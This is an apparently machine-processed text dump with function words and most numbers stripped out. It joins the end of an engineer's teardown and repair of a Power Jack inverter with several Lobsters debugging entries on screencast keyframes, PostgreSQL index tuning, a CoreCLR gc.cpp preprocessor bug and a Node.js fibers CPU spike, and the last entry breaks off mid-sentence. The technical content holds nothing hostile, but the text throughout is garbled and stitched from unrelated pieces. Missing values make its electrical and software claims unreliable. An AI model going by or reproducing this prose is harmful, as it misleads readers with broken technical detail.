part agreed sent quickly proceeded disassemble much inverter replace bad part point least part failure mechanism became clear reason dc link voltage soared far excessive value good time reason capacitor popped popped capacitor typically keep working voltage soared one overvoltage protector must failed stress trying absorb pulse created short overstressed shorted protector dead short across one set three transformer since current sensing whatsoever took mosfets side fuse could react leaking back bad mosfets shared drive circuitry three converter put mosfets continuous conduction taking like companion uncontrolled chain reaction like worst fortunately nt nuclear control circuit dumb uninformed nt notice thing displayed led everything fine poor design think new component installed inverter worked hesitant use like would burned soon instead stored away spend next several month important work using stinky noisy gasoline powered genset instead inverter much alternative energy least genset work july took inverter decided completely check understand detail cure problem daring use started one frustrating episode career electronic engineer learned design bad bad really think found bug start fixing find even instead continuing tell story chronological order list flaw one one take lot time space assure lack current sensing dcdc converter normally switching converter us current sensing better converter employ current sensor limit pulse width cyclebycycle basis allows fast precise safe control current flowing system simpler system use cyclebycycle limiting least sense average current reduce duty cycle current reaching acceptable limit avoid burning component something abnormal happens power jack inverter none due cheapness incompetence nt know unstable control loop dcdc converter inverter us control ic error amplifier configured plain simple integrator single capacitor feedback path result error amplifier constant degree phase shift power section dcdc converter dominant element filter capacitance input source resistance battery cable mosfets transformer giving power system also degree phase shift throughout low frequency range add degree together inverting nature control loop produce inphase positive feedback case positive feedback happens le limit vary depending load output third element influencing power circuit response filter inductance come last order importance much small significant effect positive feedback positive loop gain stage set selfoscillations occur cause hiccupping noticed design poor design control loop unstable almost load condition resulting inverter drawing extremely high current pulse followed pause frequency duty cycle given mostly load output measured pulse kiloampere range millisecond duration average current ten ampere flux walking pushpull converter like prone core saturation consequent failure flux walking make sure damaging saturation happen way use pulse pulse current limiting nt done inverter another method safe good enough case making error amplifier slow length subsequent pulse change much rely mosfet circuit resistance balance remaining asymmetry also done inverter error amplifier gain bandwidth product close result circuit prone core saturation mosfet destruction whenever significant coupling signal transformer feedback loop inadequate filter choke high voltage filter us two filter choke consisting turn wound yellow white toroid diameter seems amidonmicrometals equivalent assuming mentioned type toroid inductance would current low highest current choke take waveform peak load connected current level core already deep saturation effective permeability original value inductance dropped rated surge power situation even much worse beginning problem ripple current inductor pp would roughly rms ripple current theoretically increase rms well pp full load follows dcdc converter never enters continuous current mode operation always discontinuous mode peak current diode mosfets etc twice average cycle current reality output current inductor current swinging zero time mean peak current single mosfet plus magnetizing current transformer leave imagination reader guess long filter capacitor live subjected average maybe ripple current total combined ripple current rating maximum quick calculation show poor toroid work ac flux density tesla nt change much power range even relatively low load power ac flux density already almost high remains current continues increase core increasingly saturate problem high ac flux density high frequency converter operates produce whopping watt power loss core enough make coil unsolder circuit probably burn insulation andor meet curie temperature testing inverter low power watt le rated output inductor yet close full ac flux density reach higher power matter one minute got hot touch five minute started discoloring smelling burned operate correctly inverter need toroidal core many time larger wound provide hundred microhenries saturate least enable handle rated surge load would also make work much lower ac flux density producing acceptable power loss heating ala power jack taiwan cheap inept optoisolator drift feedback signal dcdc converter come optoisolator afford required galvanic insulation dc link output line potential control circuit battery potential principle fine problem designer inverter apparently nt know optoisolators strong temperature coefficient warm current transfer rate go markedly power jack inverter optoisolator used way drift directly affect regulated dc link voltage optoisolator warms dc high voltage go bang one likely trigger chain reaction burned inverter two hour compound problem optoisolator sits top case pretty warm spot unsafe feedback good design practice dictate circuit made event malfunction shut without damage whenever possible unfortunately power jack inverter made opposite way control loop us auxiliary power supply derived another auxiliary power supply use smt component stressed beyond absolute maximum rating specially ripple current rating small electrolytic cap far exceeded two auxiliary power supply fails feedback loop broken way dc high voltage soar far capacitor transient protector rating bang also high voltage sensed three tiny smt resistor series resistor rated one another third dc voltage result total power dissipation three resistor value would mean bit tight comfort ok value used resistor work well absolute maximum rating fails feedback loop opened voltage soar bang selecting different value three resistor series matter cheapness plain simple gross incompetence optoisolators le prone failing one used low area rating pretty safe anyway fails open common failure mode bang lack overvoltage protection unsafe feedback loop using optoisolator cause severe voltage drift would warrant inclusion independent overvoltage protection circuit anything event voltage rising value dangerous inverter device powered would activate safe shutdown mechanism inverter even reason use filter capacitance dc link small even quite moderately reactive load output would drive voltage dc link dangerous level sure cheap inverter nt handle highly reactive load load reactive handle safely shut instead exploding well one explodes would simple include overvoltage detection circuit shuts inverter event overvoltage would provide protection event control circuit problem overly reactive load top nt forget inverter dcdc converter two section connected series section consists three converter unit six converter individually fused fuse two converter open overload perfectly feasible scenario dcdc converter would end badly unbalanced one group providing time much voltage total voltage regulated filter capacitor rated would cause show one capacitor bang despite power jack people cheap include overvoltage shutdown necessary component afford full protection cost two dollar including either outstandingly cheap incompetent nonsensical output filter arrangement inverter us hbridge four igbts pulse width modulation produce sine wave output output filter consists two really large toroidal inductor two film capacitor seems good fine looking board see first photo page would never thought power jack engineer chose place inductor side bridge output course piece paper nt matter whether side one side electrically end series anyway practice however make whole world difference term interference device inverter one side chopper appears directly connected output negative side dc bus capacitively coupled negative battery result square wave riding output one semicycle relative battery circuit typically grounded talk big noise bomb yes emi filter output line unfortunately configured wrong way completely useless small ground bypass capacitor installed side filter go chopper rather output side surely blew lab actually connected ground result powerful signal connected straight two little ceramic cap one hot bridge side ground one negative dc link side ground want know power jack solution problem simple left ground connection emi filter disconnected result absolutely impressive alloverwhelming radio interference particularly bad many people buy sine wave inverter feed sensitive studio audio equipment laboratory instrumentation clean ac supply ha ha risk death electrocution would nt written web page bashing power jack product simply unuseable noticed gross extremely dangerous blunter joining ac input output decided write page hope nobody electrocuted yet one inverter explained beginning inverter includes battery charger switchover circuitry ups uninterruptible power supply service ac input ac output ac output switched ac input inverter output addition ac input go charger far good problem genius power jack chose use single pole relay switch one side line side remains connected time input output charger inverter result using thing standalone inverter one output pole fully exposed male ac input plug concept probably use permanently connected side neutral nt work input output connection nt use polarized connector output universal jack connected polarity input connection come taiwan stripped wire user install plug kind used country manual even one word warning phase neutral like perfectly possible someone connects inverter house leaving input disconnected us standard plug mate jack inverter house wiring normally neutral grounded depending way plug put one pin inverter input plug either neutral phase one pin exposed anyone touch folk cheap incompetent would nt hard lawyer bring charge attempted manslaughter someone actually get killed erase word attempted hope power jack inverter burn quickly enough become safe getting chance kill anybody glad nt touch exposed male plug mine short worked major scare let go back may look like petty issue lack emi filtering charger charger simple halfbridge circuit follows trend crappy chinese pc power supply absolutely emi filtering whatsoever ac input go via inrush current limiter directly rectifier filter cap igbts result charger cause severe radio interference brutal one sine wave chopper cause still severe enough disrupt hf mf radio reception even cause strong snow vhf tv instability charger control loop control circuit charger voltage current regulation fine problem control loop misdesigned resulting instability operating currentlimited mode charger pulse heavily left long enough would fail requires redesign see oscillogram charger output voltage main square wave happens triangle wave upper side square wave roughly fog around waveform noise fed main switching process see charger control loop oscillates two frequency time modulation top half volt switching frequency noise crappy design look like designer copied control loop application note source without understanding realizing meant power supply battery charger immense destabilizing capacitive load attached poor design thermal attachment power component near beginning page showed photo case mounted top separate thermal pad people smeared thermal grease vane attempt fix problem well topdown view one larger part mounting bar proper height use one tiny screw middle press two big component chance apply enough pressure bar bend apply pressure one edge part result poor thermal contact big portion part seating surface end layer air heatsink see board wedge gap pressure bar part one problem even electronic hobbyist let alone engineer know power device first must mounted heat sink soldered circuit board inverter designed way around way solder part installed heat sink becomes necessary solder first install whole board part case bolt part last step result poor seating severe mechanical stress connection pin way dcdc converter board heavy transformer mounting screw whatsoever attached pin mosfets diode oh looking cooling let tell case inverter act heatsink big power semiconductor fin outside horizontal orientation fan draw air inside fin would matter much anyway fan essentially decorative opening air enter inverter total combined area le fan area lack creepage distance required safety standard leave certain distance printed circuit track carry high voltage order prevent creepage flashover ensuing risk people damage usual line voltage millimeter decent distance well inverter many place mm clearance photo see close pcb come case whether touch small amount air remains depends mostly luck track carrying high voltage go board edge one place apparently due lax manufacturing tolerance track almost reach edge meager creepage distance kept screw hole insulating washer used keep screw directly touching copper area copper reach close screw hole thus screw thread aluminium enclosure grinded away copper dangerous place regain peace mind wrong component choice first tried charger included inverter filter capacitor charger auxiliary power supply quickly got hot bulged noticed time avoid another capacitor explosion electrolyte spillage capacitor work well bad choice nt capacitor transformer feeding reason use high voltage feed regulator chip fed high voltage regulator get warm way rather largish heatsink regulator supported solely regulator attachment anywhere rather wobbly affair also interesting note heat coming heatsink flow directly optoisolator whose warming cause regulated high voltage drift unit used ups optoisolator hot whenever inverter come make inverter produce high voltage large stranded wire nt want thread hole printed circuit board simple solution power jack style cut half strand use remaining one shall continue could name quite additional flaw page getting long already recovery attempt reduce risk burning power semiconductor first thing adding protection circuitry shown photo current sensor us two current transformer load resistor bridge rectifier sense current group secondary winding dcdc converter output parallel highest one dominate would preferred far sense primary current board layout nt lend would required essentially making new printed circuit board decided try luck secondary side current sensor installed current sensor dcdc converter board also installed overvoltage protection circuit overvoltage protector sens voltage filter capacitor separately exceeds significant time trigger small scr used shut dcdc converter light red led circuit reset inverter switched protection circuit cited somewhere page cost le two dollar work diacs form relaxation oscillator around tiny ferrite transformer trigger scr note current sensor overvoltage protection circuit galvanically insulated circuit sense foreground see one yellow toroidal core much small get extremely hot one already black burn mark moved error amplifier side optoisolator eliminate almost effect optoisolator thermal drift build new error amplifier install small board control board little room install anything error amplifier contains high voltage divider using two watt resistor series lot safer original ultratiny overloaded smd divider also inverted function optoisolator result fails output voltage go zero auxiliary supply fails voltage go zero control board modified eliminate smd high voltage divider buffer original error amplifier used internal amplifier add part needed inject signal optoisolator directly pulse width modulator provide injection point current sensor overvoltage protector got dremel severely cut main board rearranged chopper output filter one inductor side also rearranged emi filter work remove several large component cutting modification crucial safety also make unit better suited application completely separated function inverter charger operate time eliminated ups switchover functionality allowed cut nasty direct connection input output possible use charger charge battery primary energy source time running inverter power highly variable load connected allow running home including occasional load highest need short time using watt alternative energy system primary supply end reduced current setting charger originally level system feed underside board course also needed cut quite severely later soldered wire bridge place modification inverter become hugely radiofriendly output sine wave pretty clean radio noise still present minor nuisance instead totally disabling blare external filtering get rid rest also installed line filter charger input make rfquiet enough might say almost stability control loop nightmare part still nt replaced muchtoosmall filter inductor dcdc converter saturate different degree power loop converter change behavior charger managed obtain conditional stability operating condition point move controlling current controlling voltage charge cycle battery still unstable seems nothing stabilize also thermal coupling part remains improved filter inductor need replaced many minor thing really big obstacle nt see way world stabilize control loop dcdc converter time assuring develop flux walking problem issue primary current sensing flux walking prevented cyclebycycle current limiting requires using slow error amplifier thing degree phase lag add basically rc behavior power circuit create instability condition fast error amplifier phase lead instead lag would easy stabilize circuit would severe flux walking problem solution seems possible implementing primary side current sensing difficult given would done least six converter group separately current involved several hundred ampere room available tiny solution without primary side current sensing unreliable moment given intended bury shiny almost new power jack inverter deep damp hole plant tree thorny sort tree could possibly find october november spent lot time crappy inverter time already invested much time thing worth become sort obsession game challenge try make work well enough charger first digged deep charger circuit analyze exactly unstable simulated calculated finally found current loop compensation good enough voltage loop compensation correct thing work power supply connected resistive load battery charger without battery connected resonant frequency charger lc filter range hundred hertz connecting battery resonant frequency drop dramatically exact frequency depending battery capacity equivalent series resistance typically becomes le one hertz calculated new set value voltage loop compensation based largest battery bank intend charge implemented charger inconditionally stable work like charm interesting note corner frequency new loop compensation time lower power jack engineer used time gain middle frequency range much higher originally complete charger refurbishment installed power entry block switch internal emi filter added common mode choke bypass capacitor charger nt send significant noise ac line still filter battery line since one shared inverter proper left later dcdc converter filter choke ordered core wound new inductor dcdc converter output filter photo show new inductor side side original one size difference pretty obvious would say even much larger inductor still marginal limited space available inside inverter four time inductance original one retain inductance two time better high dc current addition loose watt instead watt lost original watt dissipation make big inductor get warm excessively hot watt dissipated small one make unsolder loose magnetic property discolor even selfdestroy run long enough dcdc converter loop compensation new filter inductor place least could testrun dcdc converting section stable condition ran openloop configuration measured real loop response tailored error amplifier suit phasegain behavior finally came loop compensation gain start falling introducing total three lowpass pole one dominant two drop gain high frequency point avoids fast pulse width change could drive pushpull converter singlesided saturation maintaining healthy phase margin error amplifier output stage stay regulated within volt even sine wave chopper section draw huge pulsed current remains fully stable condition tested far nt know yet arrangement prove good enough practical use least hope design mistake showing testing complete inverter suddenly output waveform started degrade one remained clean one distorted progressively getting worse worse become almost triangle wave time inverter started making quite horrible noise problem quickly traced one optocouplers sine wave chopper turning correctly producing erratic output reason problem turned utter incompetence person designed circuit optocoupler driven resistor cmos driver output produce optocoupler emitter rated absolute minimum recommended value typically still function low room temperature longer get even slightly warm optocoupler age progressively work worse low current stupid designer us resistor everywhere without even checking datasheets make sure resulting current safe range swapping resistor value produce current safe range waveform returned good sine remained even inverter warmed air flow fan sucking air closed box nt much good air ca nt enter box described air inlet opening inverter case total much fan active surface gain air flow removed two large power outlet connector multistandard connector mate almost plug used anywhere world worked well enough removing installing two standard chilean outlet type used italy much smaller able free lot space front panel gridded use air inlet total opening area three time large still small might need drill lot hole shell grounding bypassing inverter peculiar configuration part grounded way enclosure entire circuit left floating including battery emi filter output also left ungrounded thus useless battery also floating worse capacitor installed mean piece wire joining high voltage dc bus low voltage battery circuit side left battery connected volt pulse kilohertz repetition rate respective ac output turned inverter highly effective broadband noise transmitter complete dipole antenna high voltage wiring battery wiring forming two pole also made one get quite disturbing shock touching battery terminal already reconfigured output emi filter actually work grounding ground connection proceeded remove stupid shockgenerating capacitor grounded negative side battery fact mean grounding cabinet thus real earth whole low voltage control circuit provides essential safety stopped shock quickly found power jack people added capacitor new correct configuration control loop picking huge amount signal driving loop wild reason problem quickly found infinite wisdom experience person designed printed circuit board saw nothing wrong placing feedback optocoupler ground plane nothing wrong course except ground chose negative side dc link carry several hundred volt square wave respective ground look photo small white box optocoupler side board transformer optocoupler base pin directly one secondary pin transformer high voltage side significant capacitance board directly coupling several hundred volt noise highly sensitive optocoupler base terminal bypassed way great design nt think fix lifted optocoupler base terminal board reduce capacitance noise ground plane put bypassing enough reduce noise acceptable level spent lot time magic trick control loop make stable bypassing optocoupler inevitably degraded phase margin control loop point making circuit conditionally unstable end worked well required international help two people took interest marvel taiwanese engineering helped circuit simulation suggestion weak auxiliary power supply little smd transformer shown part galvanically insulated auxiliary power supply feed part feedback loop drive sine wave chopper igbts power supply typically deliver one around new error amplifier took little additional current supply voltage dropped little due unclever choice filter capacitor highsidedriver bootstrap capacitor strong current surge happen repetition rate surge ended pulling auxiliary supply limit making bridge driver drop due undervoltage result horribly distorted sine wave output first tried fix problem simply removing transformer adding turn secondary winding removed next scare transformer one winding doen common enameled wire winding us wire stronger insulation usual transformer isolate high voltage person designed pcb negated safety placing groundplane transformer connected better insulated winding touch enamelled wire side tehre even vias nt green varnish contact enamelled wire original configuration inverter insulation output side battery terminal layer wire enamel micron thick easily scratched added two layer insulating tape reinstalling transformer anyway insulation still unsafe track pcb close together right side photo rectangular diode shadow secondary side groundplane around primary side clearance two copper area far le one millimeter least battery circuit grounded flashover place would cause damage risk killing anybody adding turn transformer slightly improved voltage enough stop problem driver dropping barely later diagnosed real problem substandard pnp smd transistor fails meet hfe rating compounded design using rather weak driving increased driving produced good enough point inverter seemed working aceptable performance last improvement took wire clipper cut two resistor causing totally unnecessary power waste one parallel battery another one parallel charger ac input one battery probably intended discharge filter capacitor disconnecting inverter battery dissipated half watt time bad idea removed want able leave inverter connected battery time even without draining battery resistor ac input dissipated almost two watt got hot totally useless clueless designer included discharge tiny capacitance ac input disconnection megaohm resistor dissipating milliwatt would enough megaohm resistor line filter added could safely remove resistor causing heat undesirable location close electrolytic capacitor nt like heat gleefully closed cabinet inverter work reasonably well nt cause much interference much safer every regard time tell whether actually sturdy enough practical use poor heatsinking uncorrected problem kill uneasy feeling cheated engineering effort put bringing immature taiwanese product point used made people producing customer feeling sympathy go many people bought one inverter see blow lack expertise correct many flaw back homo ludens electronicus
521,Lobsters,debugging,Debugging,Video Troubleshooting with Keyframes,http://curi.us/1907-video-troubleshooting-with-keyframes,video troubleshooting keyframes,screenflow http http,made minute screencast screenflow knew problem normally record second space space feature macos nt anything private ever go back regular space private information get recorded like message window edit paused checked message accidentally unpaused message showing paused immediately hit marker hotkey tell screenflow mark timestamp recording saw screenflow mark timestamp testing discovered screenflow nt create marker paused dumb half second problem minute video nt much memory video problem tried find spot screenflow dragging scrubber around quickly exported video tried watching high speed vlc quicktime vlc nt work well higher playback often get stuck one frame stop showing anything quicktime play without messing tried fast see problem tried checked couple spot saw something flash relatively large change screen unwilling sit watch whole video like pay close attention spot fractionofasecond problem show maybe eighth second googled find keyframes figured lot motion instantly switch screencast message window keyframe would get created first found http time ffprobe selectstreams v showframes showentries framepicttype csv grep n cut f frameindicestxt take minute run bunch cpu worked ran found http time std diso grep syncsampleentry keyframestxt quick brew install ran quarter second saw keyframes like skimmed around kept going like keyframe every frame uh oh useful give idea could get video size lot smaller could generate fewer keyframes writing nt need many keyframes end list looked liked still every frame boring pattern wait pattern shifted start instead something must changed somewhere manually performed binary search find change point go middle see frame ending still near end go bunch see frame ending near start go bunch narrowed time way scrolled quickly right direction saw pattern change point scrolling last digit nt every time different digit frame frame per second second minute second checked video problem right showed chat message half second worked perfectly edited problem solved
522,Lobsters,debugging,Debugging,"Debugging PostgreSQL performance, the hard way",https://www.justwatch.com/blog/post/debugging-postgresql-performance-the-hard-way/,debugging postgresql performance hard way,prologue first check black box metric rds metric dashboard second check peeking inside pghero pghero action third check index size cue pgcatalog fourth check slow query pganalyze ask dbtop gotcha postico query pgstatactivity truncated behind scene continuing chase amazing visualizer tool explaining explain getting enlightened towards solution database even attempt getting prod migration almost done nice overview flyway release wrapping grafana db metric currently hiring data engineer sres business intelligence specialist,prologue justwatch collecting aggregating million different streaming offer kind video demand provider netflix amazon instant video platform collected custom web scraper built go get ingested content api order matched combined cleaned finally stored postgresql elasticsearch backends recently found upgrading postgresql database hardware behind content api pretty often one hand expected within one half year went indexing handful streaming provider three country indexing streaming provider country daily base meanwhile traffic side growing zero several million active user per month hand something still seemed crunching number top head ingest rate getting slightly slower every day actually even accounting additional catalogue size traffic growth database load used rather write heavy read increased disproportionate amount every day kept throwing money problem without really knowing one day went actually find story meant guide similar effort first check black box metric good first step diagnosing performance problem simply looking database outside fortunately using amazon rds postgresql case brought u lot necessary metric right box rds metric dashboard actually look far yes cpu quite high knew rather cpu bound purpose lot ram still freeable connection look stable sudden spiky behavior anywhere would simple resource starvation problem frequent autovacuums would seen pronounced change flatlines stage already second check peeking inside see anything outside let look inside quick first check database running wild usually using super helpful pghero tool instacart people pghero action look dashboard connecting reveals nothing particularly index size usage look good yellow tab important u right cache hit rate low still pretty okay also long running maintenance vacuum query lingering around nothing see move third check index size one caveat watch working rdbms point heavily used index fit ram anymore rule thumb see happening look like query per second graph hitting brick wall everything get worse pretty suddenly ssds tad le pronounced still visible reason le likely root problem wanted check anyway one metric pg effortlessly tell need trick cue pgcatalog one awesome thing relational database like mysql postgresql heavily dogfood pretty cool way mean lot internal runtime metadata stored relational table way available query sql like already know let use adapted http wikipostgresqlorgwikidiskusage obviously need superuser permission entry select totalbytesindexbytescoalesce tablebytes select coid nspname tableschema relname tablename creltuples rowestimate pgtotalrelationsize coid totalbytes pgindexessize coid indexbytes pgtotalrelationsize reltoastrelid toastbytes pgclass c left join pgnamespace n noid crelnamespace relkind r nspname contentdb insert db name select sum totalbytes pgsizepretty sum indexbytes entry yield gib quite close ram size enough explain increased read note look metric via pghero would half fun fourth check slow query slow query usually stem query using index whatever reason use case mainly oltp mean rather short transactional query individual entity compared reporting setup long query expected slow query thing consider logging sure take reasonable minimum time probably good first start logging also cost significant performance disk space already activated scanning slow query log see query regularly came getting harder point knew done obvious mistake server busy thing busy exactly server running million query per day might optimized others minor different problem query might slow per se might still magnitude slower others add pretty quickly usually problem affect similar type query parameter might different making hard group logging away produce large amount log impact performance need set first tool like pganalyze great helper expensive also need setup security performance implication needed something quick simple postgresql client ready use know database currently busy ask let remember pgcatalog runtime metadata go different table time select pgstatactivity list activity postgres currently happily executing u one idling around waiting lock well nice know yet much every activity taxing database one proxy good enough u query time select currenttimestamp querystart querytime sql protip separating select parameter linebreaks putting comma first let quickly comment single parameter pgstatactivity order querytime desc ordering activity query time give u equivalent poor man dbtop top might longrunning statement like autovacuum operation idling connection longrunning transaction directly see offender already gotcha say bingo well almost copying query column postico go way yet query pgstatactivity truncated however enough context identify query running wild quickly found code repository full beauty select aoldretailprice lastchangeretailprice aretailprice aoldretailprice lastchangedifference case aoldretailprice money real else aretailpriceaoldretailprice real end lastchangepercent tochar acreatedat yyyymmdd lastchangedate tochar acreatedat yyyymmdd aproviderid lastchangedateproviderid select aooldretailprice aonewretailprice oretailprice aocreatedat aoproviderid moviereference ref join auditoffers ao aoobjecttype refid aoreferenceid join offer oobjecttype refid oreferenceid reftitleid refproviderid refid aoreferenceid refproviderid aoproviderid refid oreferenceid refproviderid oproviderid aocountryid aocountryid ocountryid aomonetizationtype aomonetizationtype omonetizationtype aopresentationtype aopresentationtype opresentationtype aocreatedat interval day limit aoldretailprice null anewretailprice null aretailprice anewretailprice behind scene probably need little bit context going using postgresql main data store streaming content caring correctness normalization constraint consistency make site fast enabling multilanguage fulltext search constantly materializing entity subentities large nested elasticsearch title document contain denormalized view content catalogue also order always able track happened never writing metadata movie entity directly example writing movie reference reference u representation metadata seen certain provider ie itunes hulu matched movie composing different knowledge piece coherent justwatch title materializing result back elasticsearch retrieval display multiple type title dealing movie show season opted modelling separate table joined composite objecttype objectid key standard way modelling object inheritance sql comparing benefit drawback decided multitable inheritance model end happens query part materialization process summarizes available streaming offer title furthermore want user filter absolute relative price drop tracking history price change auditoffers table use data materialize difference historic current price final title document well continuing chase query quite lot slower query executing unfortunately anything obvious already nicely fitting index relevant joined column composite index objecttype referenceid primary index id completely missing index query probably found previous step anyway explain analyze looked clue query plan table scan nearly always bad index scan come close second still good lead way familiar deciphering execution plan text form use amazing visualizer tool help especially beginning explaining explain get nitty gritty detail really want go rabbit hole later getting enlightened first still lost slowly scrolled execution plan second time got pretty suspicious cost estimate joining auditoffers table something right suddenly hit auditoffers table might actual problem append table mean throwing price change never ever cleaning happens lot price change one movie let find get amount historic offer worst case scenario select objecttype objectid count auditoffers group objecttype referenceid order count desc limit result ouch row lookup materializing one single title getting onto something title lot different provider offer type apparently provider change movie price almost every wonder one query lot random io database looking back beginning time query make clear obviously interested price change last day towards solution common solution le row lookup would using index could create one createdat call day probably see small speedup interested last day price change overall last day price change one single reference database would need two separate index called bitmap scan would first look everything ever happened offer reference index fetch everything happened within last day bitmap scan fancy word calculating intersection slice look actual row lighted result set sound complex taxing actually reason optimization often time small database even attempt fortunately case much better way remember index objecttype objectid already nice property btree index standard case value inside index sorted mean last column composite index make exact lookup efficient range lookup always use column come super helpful case need add createdat end already existing index visual clue work remember index organized objecttype objectid createdat movie movie movie movie querying movie movie need fetch two row movie getting prod getting root problem left fixing let write migration order get production wrote migration using migration right order fix issue set schema contentdb extend index help deal ever growing auditoffers table present time problem used often executed query historylazysql create index concurrently auditofferscreatedidx auditoffers objecttype referenceid createdat drop index auditoffersidx almost done caring high availability opted creating index concurrently compared mysql postgres fortunately fully support feature box worth weight gold trying stay lock table braintree nice overview ha operation postgres backend unfortunately single drawback option absolutely run within transaction would problem otherwise totally awesome migration tool flyway would enforce transaction around every migration also usually pretty sensible feature case meant execute migration live db letting migration diverge actual database schema fortunately flyway team let u cosponsor support nontransactional migration upcoming release already looking much forward trying wrapping waiting almost hour order index building complete concurrently run kind background thread taking significantly longer curious effect voilà read iop halved grafana db metric lot room scale one le headache sre team hoped learned useful tip trick along way best general purpose open source rdmbs time dominik raute cto parttime database whisperer justwatch signing first post like learn database currently hiring data engineer sres business intelligence specialist stay tuned begun
523,Lobsters,debugging,Debugging,Parse A Monster [nice writeup of finding a bug in .NET's CLR c++ parser],http://www.empear.com/blog/parse-a-monster/,parse monster nice writeup finding bug net clr c parser,day parsed monster need monster tool software analysis software evolution series hotspot example coreclr hotspot identifies complicated code also work often challenge complex language torturing c compiler file gccpp massive github render syntax highlightning look microgrammars le cyclomatic complexity catching bug gccpp walk bug microgrammar found coreclr project complexity trend function level reveals hotspot inside gccpp keep accumulating complexity try analysis code onprem service,day parsed monster september today patched monster monster piece code many probably rely upon either directly indirectly talking garbage collector net core runtime microsoft critical piece code never intended touch reason ended hunt good test data analysis tool explored interesting approach write efficient parser story much bug found trivial fix instead want share example simplify complex problem rethinking need monster apollo program often claimed humanity greatest engineering achievement clear anyone make claim never looked c compiler complexity c compiler make landing moon look easy halfjoking since spent past week implementing c parser probably wonder earth would someone parse c land moon already highquality c parser course thing needed parser order magnitude faster take challenge let explain develop tool software analysis analysis bit different since focus evolution codebase rather static snapshot code example given large codebase hundred developer prioritize improvement technical debt actually matter software evolution provides critical part answer question like concept hotspot central part analysis hotspot complicated code need work often hotspot based actually work code static property long time presented hotspot file level case hotspot give information act upon however sometimes come across hotspot file several thousand line code point someone let say file line code say hey problem refactor module fine helpful hence started work xray feature introduced software r evolution series hotspot example coreclr hotspot identifies complicated code also work often xray let identify hotspot inside file resolution functionmethod level pull need analyze source code explains interest parser let meet challenge challenge complex language programming language differ lot syntax example lisp language family trivial parse since lisp minimalistic uniform syntax end spectrum find c c notoriously hard expensive parse particularly true modern c make heavy use template metaprogramming torturing c compiler living seen compilation time go roof point become serious productivity bottleneck performance impact hit tool harder make lot pass file reason analyze evolution code mean need parse historic revision file large hotspot may hundred revision performance hit add quick first approach parsing c use complete language grammar c write unit test different corner case prefer rely realworld production data test found approach give return time invest test since c many style flavor tested lot different open source project also managed find excellent measurement stick performance gccpp net core runtime gccpp c file around line code fact big github refuse render code file gccpp massive github render syntax highlightning line code would scary language c lowlevel abstraction manual memory management becomes true monster encourage take quick look code wait please go ahead look gccpp particularly object oriented case c used bjarne stroustrup label better c yes u would like add definition better slightly stronger type system basic class gccpp critical code term performance correctness error impact million user software system kind code really impressive downright scary time first attempt fullblown c parser failed miserably first gccpp took forever parse forever case mean minute since revision gccpp parse became quite impractical addition real parser play well macro preprocessor directive adding support option since end even worse performance better lead investigate novel strategy based something called microgrammars let see microgrammar microgrammars le often get asked different company simplify code course lot different strategy important one start end start problem found simplifying problem try solve much higher payoff focusing solution applied lesson tried improve c parser approach based concept called microgrammars let give example want get approximation complex piece code could calculate cyclomatic complexity mean need count number branch loop function microgrammars simplify problem realizing code important u let say attempt parse ifstatement detailed conditional statement carry additional information free ignore detail microgrammar embrace fact parse general structure conditional logical boolean expression discarding detail suitable microgrammar approach massively simplifies parsing complete c grammar consisted line tricky rule rewrote microgrammar approach reduced rule set line code line include lexer parser rule reduction size complexity make wonder ability reason code line something build mental model hence reason big win moved optimize grammar rule hard optimize code reason reduction cognitive effort needed understand code big win critical win respect runtime performance using microgrammar approach able parse gccpp millisecond order magnitude faster important fast enough tool provide good user experience please note implementation clojure exactly known blazing speed interesting however get significant performance increase rethinking problem rather traveling abstraction ladder reimplement code lowlevel language even surprising microgrammar good enough detect bug gccpp real parser miss let explain catching bug gccpp far praised microgrammar approach however want pointout writing microgrammar necessarily easy trick particular respect performance minimize look ahead micro parser mean need keep grammar general enough agnostic large part language time specific matter tradeoff also reason micro parser hard work tradeoff c conditional compilation strip away conditional compilation statement since would lead invalid coding construct like unbalanced curly brace case aware conditionals found bug gccpp celebrated performance victory realized got warning parser error handling strategy report parse failure try resynchronize next recognized parse token warning got complained extraneous closing curly brace suspected glitch parse rule spend time debugging looked test code finally found walk bug microgrammar found see code moment someone undefines backgroundgc code compile anymore try good citizen found bug patched error submitted pull request coreclr project patch trivial interesting whats interesting though bug trivial hidden undetected long time critical welltested peer reviewed codebase first take away software incredibly hard get right also fascinating case microgrammar catch problem full scale compiler might miss preprocessing really part c compiler second take away relates microgrammar rethinking problem managed significantly reduce complexity code big runtime performance leave xray result gccpp well microgrammar able analyze whole evolution file answer question top hotspot function level function gcheap growbrickcardtables function line code data indicates simplification code likely make future maintenance cheaper since function part development effort gccpp past year addition see hotspot gcheap growbrickcardtables becomes complicated time complexity trend function level reveals hotspot inside gccpp keep accumulating complexity try analysis code provide analysis onprem service signup explore hotspot codebase codesceneio free open source project bug c xray feature know blame adam tornhill september
524,Lobsters,debugging,Debugging,The Mysterious Fiber Bomb Problem: A Debugging Story,https://sandstorm.io/news/2016-09-30-fiber-bomb-debugging-story,mysterious fiber bomb problem debugging story,mysterious fiber bomb problem debugging story kenton varda eating cpu scale nodefibers npm package meteor creating bad monkeypatch proto patched filed issue,mysterious fiber bomb problem debugging story kenton varda sep month two ago started seeing mysterious problem production every one nodejs web server process supporting sandstorm oasis would suddenly jump cpu usage one core stay killed problem infinite loop though process continued respond request slowly since process continued respond request continued pas health check never restarted automatically user assigned shard service essentially unusable every action would take second complete problem left nothing suspicious log gap far fewer request normal handled first problem struck week seemingly random kind bug web worst nightmare debug something reproduce week random real user line could even cause process slow stop way eating cpu obviously needed take cpu profile bug progress course bug reproduced production therefore take profile production ruled profiling technology would harm performance time instrumented binary need sampling profiler could run existing process ondemand would understand c javascript last requirement ruled personal favorite profiler pprof googleperftools luckily turn correct modern answer tool sampling profiler relies linux kernel apis thus requiring loading code target binary least cc javascript turn builtin support generating tell tool map jited code location back javascript source pas perfbasicprofonlyfunctions flag node commandline flag safe production writes data disk time rebuild vms weekly file never get large enough problem armed new knowledge waited finally day pager went shelled broken server recorded tensecond profile restarted node downloaded data analysis upon running perf presented well look promising almost time spent two c function perf viewer make easy jump directly disassembly wow almost cpu time spent handful instruction fact looking two different inlined copy c code looking loop traverse linked list trying find element particular id spending majority cpu time scanning one linked list scale code might surprised see word implement javascript language known almost militantly opposed thread turn though support simulated thread implemented entirely userspace cooperative switching node user take advantage via nodefibers npm package package allows avoid instead instantiating arbitrarily many call stack jumping whenever need wait asynchronous operation code fact using nodefibers mostly built meteor us fiber default linked list question implement map thread id perthread data threadlocal variable among thing every time process switch fiber current thread looked table fresh c grad know linked list ideal data structure lookup table probably want hashtable redblack tree like many experienced engineer know linked list 